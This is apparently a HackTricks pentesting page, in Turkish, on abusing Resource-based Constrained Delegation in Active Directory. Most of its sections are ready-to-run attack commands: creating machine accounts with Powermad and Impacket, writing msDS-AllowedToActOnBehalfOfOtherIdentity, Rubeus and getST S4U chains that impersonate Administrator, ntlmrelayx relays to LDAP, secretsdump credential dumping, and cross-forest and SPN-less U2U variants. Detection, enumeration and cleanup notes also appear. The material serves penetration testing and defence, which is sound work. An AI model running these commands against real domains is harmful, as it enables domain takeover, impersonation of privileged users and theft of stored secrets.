# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) yöntemine benzer, ancak güven yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegasyon yapabileceğini kaydeder; RBCD ise **hedef kaynakta**, hangi principal'ların o kaynağa kullanıcıları impersonate edebileceğini kaydeder.<sup>[[12]](#references)</sup>

Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliği, o kaynak için diğer kimlikler adına hareket etmesine izin verilen principal'ları tanımlayan bir security descriptor içerir.

Diğer önemli bir fark, **bir makine hesabı üzerinde yeterli write iznine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzeri haklar) sahip bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliğini ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak için normalde daha ayrıcalıklı yönetici erişimi gerekir.<sup>[[1]](#references)</sup>

Daha kesin olarak, klasik constrained-delegation ayarlarını değiştirmek için genellikle bir domain controller üzerinde `SeEnableDelegationPrivilege` gerekir; bu hak normalde yüksek ayrıcalıklı yöneticilerde bulunur. RBCD, kararı hedef nesnenin security descriptor'ına bırakır. Bu nedenle ilgili computer-object özniteliğine write erişimi, söz konusu kullanıcı hakkı olmadan da yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Yeni Kavramlar

`userAccountControl` içindeki **`TrustedToAuthForDelegation`** flag'i genellikle **S4U2Self** için bir ön koşul olarak tanımlanır, ancak bu eksik bir açıklamadır.\
SPN'si olan bir service principal, flag olmadan da S4U2Self isteğinde bulunabilir. `TrustedToAuthForDelegation` varsa döndürülen service ticket **forwardable** olur; yoksa ticket normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>

Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable bir TGS**'yi reddeder. RBCD ise hedefin security descriptor'ı istekte bulunan servise yetki veriyorsa bu S4U2Self ticket'ını kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Saldırı Yapısı

> Bir **computer account** üzerinde **write'a eşdeğer ayrıcalıklara** sahipseniz, o makineye ayrıcalıklı erişim elde edebilirsiniz.

Saldırganın kurban computer object üzerinde **write'a eşdeğer ayrıcalıklara** zaten sahip olduğunu varsayın.

1. Saldırgan, **SPN**'si olan bir hesabı **ele geçirir** veya bir tane **oluşturur** ("Service A"). Varsayılan olarak, kimliği doğrulanmış bir domain kullanıcısı **_MachineAccountQuota_** tarafından belirlenen sınır uyarınca en fazla 10 computer object oluşturabilir; bir computer object otomatik olarak kullanılabilir SPN'ler sağlar.
2. Saldırgan, Service A'nın kurban computer'a (ServiceB) karşı herhangi bir kullanıcıyı impersonate etmesine izin verecek şekilde **resource-based constrained delegation** yapılandırmak için kurban computer üzerinde sahip olduğu WRITE ayrıcalığını **kötüye kullanır**.
3. Saldırgan, Service B'ye ayrıcalıklı erişimi **olan bir kullanıcı** için Service A'dan Service B'ye **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
   1. S4U2Self (ele geçirilen veya oluşturulan SPN hesabından): Service A'ya Administrator'ı temsil eden bir **TGS** ister (non-forwardable).
   2. S4U2Proxy: **non-forwardable TGS**'yi kullanarak kurban host'a **Administrator**'ı temsil eden bir service ticket ister.
   3. Hedef kaynağın security descriptor'ında Service A'ya yetki verildiği için bu RBCD akışında non-forwardable ticket yine de çalışabilir.
4. Saldırgan, kurban ServiceB'ye **erişim elde etmek** için **pass-the-ticket** yapabilir ve kullanıcıyı **impersonate edebilir**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0`, varsayılan computer oluşturma yolunu kapatır; ancak hedef computer object üzerindeki write haklarını veya mevcut bir hesabın kontrolünü ortadan kaldırmaz. SPN'si olmayan, kontrol edilen sıradan bir kullanıcı bazen [SPN-less U2U yöntemi](#spn-less-cross-domain--cross-forest-rbcd) aracılığıyla delegasyon yapan principal olarak kullanılabilir; bu, tek bir domain içinde de mümkündür. Bu yol yine de etkili bir RBCD write hakkı, delegasyon yapan kullanıcının kimlik bilgileri üzerinde kontrol, impersonate edilen bir kimliğin delegasyona uygun olması, uyumlu Kerberos şifreleme davranışı ve hesabı aksatacak bir NT hash değişikliği gerektirir. Bunları birbirinden ayrı ön koşullar olarak değerlendirin; RBCD özniteliğinin boş olması veya kotanın sıfır olması tek başına ne başarının ne de güvenliğin kanıtıdır.

Mevcut bir RBCD descriptor'ı, delegasyon yapan computer'ı doğrudan belirtmek yerine bir **group** da belirtebilir. SPN'si olan bir computer account'u kontrol ediyorsanız ve onu bu group'a ekleyebiliyorsanız, yeni üyelik hedef computer'ın RBCD özniteliğini değiştirmeden delegasyon yolunu sağlayabilir. Bu yolun çalıştığı sonucuna varmadan önce group'un etkin üyelik-yazma ACL'sini (deny ACE'ler dahil), iç içe üyelikleri ve token yenilemeyi, descriptor'daki trustee SID'yi, impersonate edilen hesabın delegasyon kısıtlamalarını ve hedef service SPN'yi kontrol edin.

Domain'in _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Saldırı

### Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad):** kullanarak domain içinde bir bilgisayar nesnesi oluşturabilirsiniz<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation'ı Yapılandırma

**Active Directory PowerShell modülünü kullanarak**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview kullanarak**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Eksiksiz bir S4U attack gerçekleştirme (Windows/Rubeus)

Öncelikle, parolası `123456` olan yeni Computer nesnesini oluşturduk; bu nedenle bu parolanın hash değerine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Bu, söz konusu hesap için RC4 ve AES hash'lerini yazdırır.\
Şimdi saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeus'un `/altservice` parametresini kullanarak yalnızca bir kez istekte bulunup daha fazla hizmet için daha fazla ticket oluşturabilirsiniz:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Kullanıcılar **"Hesap hassastır ve devredilemez."** olarak işaretlenebilir. Bu bayrak etkinse, bu delegation akışı üzerinden hesabın kimliğine bürünülemez. BloodHound analiz sırasında bu özelliği gösterir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux kullanıyorsanız, resmi Impacket araçlarını kullanarak RBCD zincirinin tamamını gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notlar
- LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
- AES keys kullanmayı tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus yalnızca AES kullanan akışları destekler.
- Impacket bazı araçlar için `sname`'i ("AnySPN") yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi alın (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### SPN'siz, yalnızca Kerberos kullanan bir delegator için Reflective RBCD

**`msDS-AllowedToDelegateTo` olup SPN'si veya `TrustedToAuthForDelegation`'ı olmayan** ele geçirilmiş bir kullanıcı, sıradan S4U2Self ile [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) için gereken forwardable evidence ticket'ı üretemez.<sup>[[1]](#references)[[18]](#references)</sup> Bu kullanıcı kendi AD object'i üzerinde RBCD yazabiliyorsa, saldırganın kontrolündeki, SPN'si olan bir hesap önce kullanıcıya delege edebilir.<sup>[[1]](#references)[[18]](#references)</sup> Bu RBCD adımı, taklit edilen kullanıcı için SPN'siz hesaba yönelik forwardable bir ticket sağlar; bu ticket, ele geçirilmiş hesabın klasik delegation allow-list'indeki bir SPN'ye yapılacak ikinci bir S4U2Proxy isteği için evidence olur.<sup>[[18]](#references)[[19]](#references)</sup>

SPN'siz ilk adım için helper hesabın S4U2Proxy isteğinde **U2U** kullanılmalıdır: `enc-tkt-in-skey`, KDC'nin ticket'ı bir SPN key'i aramak yerine delegator'ın TGT session key'iyle şifrelemesini sağlar.<sup>[[18]](#references)[[19]](#references)</sup> KDC ayrıca `PA-PAC-OPTIONS` içindeki RBCD bitine, delegator'ın TGT'sine ve S4U2Self evidence ticket'ına ihtiyaç duyar.<sup>[[18]](#references)[[20]](#references)</sup> Yazarın Impacket `getST.py` fork'u bu istek için `-nospn` ve `-tgt` seçeneklerini ekler; `-nospn`/`-tgt` desteği upstream Impacket PR #2324'te bulunduğundan, stock `getST.py`'nin bu adımı desteklediğini varsaymak yerine bağlantıdaki fork'u kullanın.<sup>[[18]](#references)[[20]](#references)</sup>

Bu örnekte `svc_web`'in ele geçirildiği, kendi RBCD attribute'unu yazabildiği ve `host/dc01.corp.local`'a delege etme izni olduğu varsayılır. Ayrıca SPN'si olan bir helper oluşturulabildiği, RC4'e izin verildiği ve seçilen `Administrator` hesabının delegable olduğu varsayılır. Ele geçirilen hesabın NT hash'ini kullanarak bir **RC4 TGT** isteyin. Yazarın fork'undaki **ilk** `getST.py`'yi çalıştırın; `describeTicket.py` çıktısını inceleyin ve aşağıda onun **RC4 TGT session key**'ini kullanın. Son `getST.py` stock Impacket olabilir. NT hash'ini değiştirmeden **önce** TGT isteğini gerçekleştirin; bu değişiklik, parolası sıfırlanana kadar service account'u aksatır.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Aşağıdaki [SPN-less RBCD yolundan](#spn-less-cross-domain--cross-forest-rbcd) farklı olarak bu zincirde SPN-less hesap önce **RBCD hedefi**, ardından **classic KCD delegator** olarak kullanılır. Yine de SPN’si olan ve kontrolünüzde bulunan başka bir hesap gerekir. `MachineAccountQuota=0` ise önceden kontrol edilen SPN’li bir hesap yeni bilgisayar hesabının yerini alabilir; tek başına sıfır kota bu yolu engellemez.<sup>[[18]](#references)[[19]](#references)</sup>

## Cross-domain & cross-forest RBCD

Kontrol ettiğiniz **delegating principal**, **resource computer** ile **farklı bir etki alanında** (hatta **farklı bir ormanda**) bulunuyorsa, kötüye kullanım yine **RBCD**’dir; ancak bilet akışı artık alışılagelen tek etki alanlı `S4U2Self -> S4U2Proxy` akışı değildir.

### Cross-domain RBCD: yabancı principal'ı SID ile yapılandırma

`msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini **farklı bir etki alanından** ayarladığınızda, yabancı makine/kullanıcı hedef etki alanının LDAP’ında **adla çözümlenemeyebilir**. Bu durumda delegasyon girdisini sAMAccountName/UPN yerine yabancı principal’ın **SID**’sini kullanarak yapılandırın.

Bu, özellikle `ntlmrelayx.py` ile NTLM’yi LDAP’a relay ederken önemlidir:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notlar:
- `--sid`, `ntlmrelayx.py`'ye `--escalate-user` değerini SID olarak ele almasını söyler; delegasyon yapan hesap hedef etki alanının dışındaysa bu gereklidir.
- Araç `User not found in LDAP` yazdırsa bile delegasyon yazma işlemi başarılı olabilir; çünkü güvenlik tanımlayıcısı yabancı SID'yi doğrudan depolar.

### Etki alanları arası RBCD: cross-realm S4U sıralaması

Yabancı principal `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra, çalışan etki alanları arası akış şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegasyon yapan principal için kendi etki alanından bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
3. Hedef etki alanı DC'sinde taklit edilen kullanıcı için bir **cross-realm S4U2Self referral** isteyin.
4. Bu kullanıcı için asıl **S4U2Self** biletini delegasyon etki alanında tekrar isteyin.
5. Hedef etki alanı için bir referral bileti almak üzere delegasyon etki alanında **S4U2Proxy** gerçekleştirin.
6. `cifs/host.target`, `host/host.target` vb. için hizmet biletini almak üzere hedef etki alanı DC'sinde son **S4U2Proxy** işlemini gerçekleştirin.

Bu nedenle standart Linux araçları etki alanları arası RBCD işlemlerinde genellikle başarısız olur:<sup>[[9]](#references)</sup>
- İstekteki **realm** değerinin, `TGS-REQ` içinde kullanılan TGT'nin realm değerinden farklı olması gerekebilir.
- Zincirde yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** işlemi değil, birbirinden bağımsız **S4U2Proxy adımları** gerekir.

### Linux'tan etki alanları arası RBCD

Synacktiv, iki KDC'yi açıkça ele alarak Linux'tan cross-realm sıralamasını yeniden oluşturan bir Impacket `getST.py` uygulaması yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegating** domain’in DC’si
- `-targetdomain`: **resource computer**’ın domain’i
- `-targetdc`: **resource** domain’in DC’si

### Forest'lar arası RBCD sınırlamaları

Forest'lar arası RBCD’nin önemli bir sınırlaması vardır: **impersonate edilen kullanıcı, delegating principal ile aynı forest’a ait olmalıdır**. Başka bir deyişle, kontrol ettiğiniz makine hesabı `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, RBCD aracılığıyla bu resource’a erişirken genellikle rastgele `asgard.local` kullanıcılarını impersonate **edemezsiniz**.<sup>[[9]](#references)</sup>

Şu durumlarda yine de istismar edilebilir:
- **delegating forest** kullanıcısı, diğer forest’taki resource host’ta **local admin** (veya başka bir şekilde ayrıcalıklı) ise
- bir trust gerekli kimlik doğrulama yoluna izin veriyorsa ve hedef bilgisayarın security descriptor’ında yabancı SID kabul ediliyorsa

### Forest'lar arası RBCD protokolündeki tuhaflıklar

Forest'lar arası RBCD, yalnızca "trust ile birlikte cross-domain" değildir. Gözlemlenen akışta, yaygın araçların geçmişte gözden kaçırdığı iki tuhaflık bulunur:<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** ayarlayan ek bir **S4U2Proxy** isteği
2. Diğer etype’lar istenmiş olsa bile, son service ticket’ın **RC4** kullanılarak döndürülebilmesi

Pratik akış şöyledir:

1. Forest A’daki delegating principal için bir TGT alın.
2. Forest A’da impersonate edilecek kullanıcı için **S4U2Self** isteği gönderin.
3. Forest A’da **S4U2Proxy** isteği göndererek Forest B için bir referral TGT alın.
4. Forest A’da, S4U2Self ticket’ını additional ticket olarak eklemeden, ancak `branch-aware` etkinleştirilmiş şekilde ikinci bir **S4U2Proxy** isteği göndererek Forest B için başka bir referral TGT alın.
5. İsteğe bağlı olarak Forest B’de delegating principal için normal bir service ticket isteyin (bu ticket son istismar için gerekli değildir).
6. Hedef SPN’ye, impersonate edilen Forest A kullanıcısı için Forest B’de son **S4U2Proxy** ticket’ını istemek üzere 3. ve 4. adımlardaki referral ticket’larını kullanın.

### Linux'tan forest'lar arası RBCD

Aynı Synacktiv Impacket branch’i bu mantık için `-forest` seçeneğini ekler:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Recursive multi-domain RBCD (3+ etki alanı)

**Multi-domain forest**'larda hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **recursive** olabilir:

- **Recursive S4U2Self**: İlk `S4U2Self`, **impersonate edilen kullanıcının etki alanına** gönderilir; ara parent/child geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referral'larıyla yapılır ve **son `S4U2Self`**, **delegating principal'ın kendi etki alanına** gönderilir.
- Bu, yalnızca bir makine hesabı için **TGT**'ye sahip olmanın, aynı forest'taki başka bir etki alanından bir **admin'i impersonate etmek** ve `cifs/host`, `host/host`, `wsman/host` vb. istemek için yeterli olabileceği anlamına gelir.
- **Recursive S4U2Proxy** de trust chain'i aynı şekilde izler: ara geçişlerde önceki ticket, sonraki `krbtgt/<REALM>` referral'ı istenirken TGT olarak yeniden kullanılır ve yalnızca son geçiş nihai service ticket'ı döndürür.<sup>[[10]](#references)</sup>

Aynı forest içinde pratik bir örnek:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

**Delegating principal bir SPN'siz kullanıcıysa**, son recursive `S4U2Self` işlemi **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Çözüm, **yalnızca son adımı `S4U2Self+U2U` olarak yeniden denemektir**.<sup>[[10]](#references)</sup>

Abuse zincirinin kısa hâli:

1. KDC'yi **RC4-HMAC'e (etype 23)** yönlendirmek için **NT hash** ile authenticate olun.
2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT session key**'i çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash**'ini bu **session key** ile değiştirin.
5. Ayrı bir **`-proxy`** isteği sırasında `S4U2Self+U2U` ticket'ını **`-additional-ticket`** olarak yeniden kullanın.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operasyonel uyarılar:

- **İlk güvenilen hop zaten başka bir forest ise**, yerel Windows davranışına uygun sonuç almak için **branch-aware** algoritmasını (`getST.py ... -forest`) tercih edin. Yabancı forest'a zincirin yalnızca **daha sonraki** bir aşamasında ulaşılıyorsa, branch-aware olmayan recursive akış yine de işe yarayabilir.<sup>[[9]](#references)</sup>
- Yakın tarihli **Windows Server 2022/2025** DC'lerde, RC4'ün kullanımdan kaldırılması nedeniyle zorunlu RC4 işlemi **`KDC_ERR_ETYPE_NOSUPP`** hatasıyla başarısız olabilir; bu durumda klasik SPN destekli RBCD AES ile çalışsa bile **SPN'siz RBCD** imkânsız hale gelebilir.<sup>[[15]](#references)</sup>
- Kullanıcının hash'ini/parolasını değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: **`SamrChangePasswordUser`** hesabın Kerberos AES anahtarlarını **yeniden hesaplamaz**; bu nedenle önce parola değişikliği yapmak sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
- Taklit edilen hesap hâlâ **delegable** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarına sahip hesaplar zinciri engeller.

## Tespit / güçlendirme notları

- Domain/forest'lar arasındaki RBCD yolları genellikle hâlâ **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** zorunlu kılın.
- Computer nesnelerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` özelliğine kimlerin yazabildiğini denetleyin ve **foreign security principals** dahil depolanan SID'leri çözümlendirin.
- Trust'ların yoğun olduğu ortamlarda **Selective Authentication**, **SID filtering** ve yabancı bir forest'taki kullanıcıların kaynak host'larda **local admin** haklarına sahip olup olmadığını gözden geçirin.

### Erişim

Son komut satırı **tam S4U saldırısını gerçekleştirir ve Administrator hesabından victim host'a ait TGS'yi belleğe inject eder**.\
Bu örnekte Administrator hesabından **CIFS** hizmeti için bir TGS istendiğinden **C$**'a erişebilirsiniz:

```bash
ls \\victim.domain.local\C$
```

### Farklı service ticket'larını kötüye kullanma

[**Kullanılabilir service ticket'ları hakkında buradan bilgi edinin**](silver-ticket.md#available-services).

## Sayım, denetim ve temizlik

### RBCD yapılandırılmış bilgisayarları listeleme

PowerShell (SID'leri çözümlemek için SD'yi decode etme):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (tek komutla oku veya flush et):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD'yi temizleme / sıfırlama

- PowerShell (özniteliği temizle):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'i sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya RC4, AES128 ve AES256 hash'lerinin tümünü sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında görülen **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal'ın muhtemelen **SPN'si yoktur**. **Son hop** için normal bir `S4U2Self` yerine **`S4U2Self+U2U`** deneyin.<sup>[[10]](#references)</sup>
- **SPN'siz RBCD** sırasında görülen **`KDC_ERR_ETYPE_NOSUPP`**: Güncel DC'ler, `S4U2Self+U2U` + session-key-substitution hilesinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik, **SPN destekli** bir RBCD yolu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- S4U2Proxy sırasında görülen **`KDC_ERR_BADOPTION`**: Impersonate edilen hesabın delegation kısıtlamalarını, evidence ticket'ın forwardable bayrağını ve classic KCD'nin ya da hedefin RBCD descriptor'ının bu hop'a izin verip vermediğini kontrol edin. Bu bir **KDC delegation-policy hatasıdır**; hedef hizmetin çalışıp çalışmadığını veya kullanıcının uygulama düzeyinde erişimi olup olmadığını test etmez. Kayıtlı olmayan bir hedef SPN normalde bunun yerine **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasına yol açar.<sup>[[21]](#references)[[22]](#references)</sup>

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay zincirleri, tek adımda yerel SYSTEM elde etmek için sıklıkla RBCD ile sonuçlanır. Uygulamalı uçtan uca örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos auth'u LDAP'ye relay edebilir, hedef bilgisayar nesnesindeki `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini machine account'unuz için ayarlayabilir ve host dışından S4U aracılığıyla hemen **Administrator** kimliğine bürünebilir.<sup>[[8]](#references)</sup>

## References

- [1] [Köpeği Kuyruğundan Sallamak: Active Directory'ye Saldırmak için Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation Üzerine Başka Bir Söz – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
